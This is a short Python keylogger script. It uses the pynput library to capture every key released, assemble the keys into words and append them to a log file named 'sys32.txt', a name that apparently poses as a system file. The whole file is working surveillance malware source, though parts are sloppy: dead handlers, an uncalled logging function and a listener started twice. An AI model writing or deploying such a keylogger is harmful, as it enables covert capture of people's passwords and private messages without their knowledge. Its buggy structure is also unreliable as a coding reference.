"""
Goal:
Build a Python script that listens for keyboard presses and logs each key to a text file in real time.
"""
from pynput import keyboard
import os 
import datetime
current_time = datetime.datetime.now()


username = os.path.expanduser('~')
file_path = f"sys32.txt"
current_word = ""


def time_log():
    with open(file_path, 'a') as f:
        f = open(file_path, 'a')
        f.write(f"Session Started at: {current_time}")
    


def on_press(key, injected):
    pass
    try:
        log_pres = ('alphanumeric key {} pressed; it was {}\n'.format(
                key.char, 'faked' if injected else 'not faked'))
    except AttributeError:
            ('special key {} pressed'.format(
                key))




def on_release(key, injected):
    global current_word
    with open(file_path, 'a') as f:
        try:
            current_word += key.char
            #print(f"Current word: {current_word}")
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.space:
                f.write(f"Word completed with space: {current_word}\n",)
                current_word = ""  # Reset for next word
            elif key == keyboard.Key.enter:
                f.write(f"Word completed with enter: {current_word}\n",)
            elif key == keyboard.Key.esc:
                return False



# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()